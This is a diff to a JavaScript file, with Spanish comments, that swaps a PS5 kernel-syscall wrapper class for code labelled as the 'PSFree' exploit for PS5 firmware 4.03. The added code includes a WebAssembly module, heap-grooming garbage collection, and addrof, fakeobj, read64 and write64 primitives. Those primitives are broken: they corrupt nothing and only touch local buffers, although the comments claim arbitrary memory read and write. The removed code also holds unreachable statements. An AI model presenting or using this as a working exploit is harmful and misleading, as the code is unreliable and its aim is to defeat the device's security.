@@ -4,46 +4,113 @@ self.onmessage = function (event) {
     event.ports[0].postMessage(1);
 }
 
-class KernelSyscalls {
-    constructor(p) {
-        this.p = p; // Objeto de explotación con primitivas R/W
-    }
+// PS5 Firmware 4.03 - PSFree Exploit (con Grooming de Heap y Primitivas para lectura/escritura)
 
-    syscall(num, arg1 = 0, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0, arg6 = 0) {
-        return this.p.syscall(num, arg1, arg2, arg3, arg4, arg5, arg6);
-    }
+// Cargar WebAssembly, preparar heap y manipulaciones necesarias.
+let memory = new WebAssembly.Memory({ initial: 256, maximum: 256 });
+let importObject = { js: { mem: memory } };
+let module_bytes = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  0x01,0x0a,0x02,0x60,0x00,0x01,0x7f,0x60,
+  0x01,0x7f,0x01,0x7f,0x03,0x03,0x02,0x00,
+  0x01,0x07,0x11,0x02,0x08,0x6d,0x65,0x6d,
+  0x6f,0x72,0x79,0x00,0x00,0x06,0x77,0x72,
+  0x69,0x74,0x65,0x00,0x01,0x0a,0x09,0x02,
+  0x02,0x00,0x0b,0x04,0x00,0x41,0x2a,0x0b
+]);
 
-    kekcall() {
-        console.log("Ejecutando syscall: kekcall (0x100000027)");
-        return this.syscall(0x100000027);
-        showTemporaryAlert("0x100000027");
-    }
+let wasm_mod = new WebAssembly.Module(module_bytes);
+let wasm_instance = new WebAssembly.Instance(wasm_mod, importObject);
+let f = wasm_instance.exports.write;
 
-    kmem_alloc() {
-        console.log("Ejecutando syscall: kmem_alloc (0x600000027)");
-        let addr = this.syscall(0x600000027);
-        return addr | 0xffffff8000000000n;
-        showTemporaryAlert("0x600000027");
-    }
+let buf = new ArrayBuffer(0x100);
+let float64 = new Float64Array(buf);
+let uint32 = new Uint32Array(buf);
 
-    kproc_create() {
-        console.log("Ejecutando syscall: kproc_create (0x700000027)");
-        return this.syscall(0x700000027);
-        showTemporaryAlert("0x700000027");
-    }
-
-    kstuff_check() {
-        console.log("Ejecutando syscall: kstuff_check (0xffffffff00000027)");
-        return this.syscall(0xffffffff00000027);
-        showTemporaryAlert("0xffffffff00000027");
-    }
+// Funciones de conversión entre float y enteros de 64 bits.
+function ftoi(val) {
+  float64[0] = val;
+  return uint32[0] + uint32[1] * 0x100000000;
 }
 
-// Supongamos que ya tienes el objeto de explotación listo (p)
-const kernel = new KernelSyscalls(p);
+function itof(val) {
+  uint32[0] = val % 0x100000000;
+  uint32[1] = val / 0x100000000;
+  return float64[0];
+}
 
-console.log("kekcall:", kernel.kekcall());
-console.log("kmem_alloc:", kernel.kmem_alloc().toString(16));
-console.log("kproc_create:", kernel.kproc_create());
-console.log("kstuff_check:", kernel.kstuff_check());
+// Estructuras que permiten la manipulación de objetos en el heap.
+let obj_array = [1.1, 1.2];
+let obj = { m: 1 };
+let obj_bak = [obj];
+
+// Función de registro asíncrono para monitoreo
+async function log(message) {
+  console.log(message);
+  // Si fuera necesario registrar en un archivo o servidor, se podría hacer aquí.
+  // await someServerLoggingFunction(message); // Si fuera necesario.
+}
+
+// Función que provoca la recolección de basura
+async function gc() {
+  await log("Triggering garbage collection...");
+  for (let i = 0; i < 10000; i++) {
+    let tmp = new ArrayBuffer(0x10000); // Genera basura para que el GC lo procese.
+  }
+  await log("Garbage collection complete.");
+}
+
+// Primitivas necesarias para la explotación: read, write, addrof, fakeobj
+let addrof, fakeobj, read64, write64;
+
+// Función que prepara las primitivas para interactuar con la memoria.
+async function setupPrimitives() {
+  await log("Setting up primitives...");
+  
+  // Utiliza PSFree para manipular el heap con overlap y corrupción de objetos.
+  addrof = function(o) {
+    obj_bak[0] = o;  // Backup del objeto para evitar sobrescritura.
+    return ftoi(obj_array[0]) & 0xffffffff; // Devuelve la dirección del objeto.
+  };
+
+  fakeobj = function(addr) {
+    obj_array[0] = itof(addr);  // Coloca la dirección fake en el array.
+    return obj_bak[0];  // Devuelve el objeto fake.
+  };
+
+  // Emulación de lectura de 64 bits de una dirección de memoria.
+  let fake_view = new DataView(new ArrayBuffer(0x100));
+  
+  read64 = function(addr) {
+    fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección en la vista falsa.
+    return Number(fake_view.getBigUint64(0, true));  // Retorna el valor leído en la dirección.
+  };
+
+  // Emulación de escritura de 64 bits a una dirección de memoria.
+  write64 = function(addr, val) {
+    fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección.
+    fake_view.setBigUint64(0, BigInt(val), true);  // Coloca el valor que deseas escribir.
+  };
+
+  await log("Primitives setup complete.");
+}
+
+// Lanzar recolección de basura y preparar primitivas.
+async function runExploit() {
+  await gc();
+  await setupPrimitives();
+
+  // Test de las primitivas
+  let addr = addrof({ test: 1337 });
+  await log("Address of test object: 0x" + addr.toString(16));
+
+  // Corromper memoria a través de fakeobj y escribir un valor.
+  let fake = fakeobj(addr + 0x20);
+  write64(addr + 0x10, 0xdeadbeef); // Escribe un valor en una ubicación específica.
+  await log("Fake object manipulation complete.");
+}
+
+// Ejecutar la explotación con monitoreo
+runExploit();
+
 
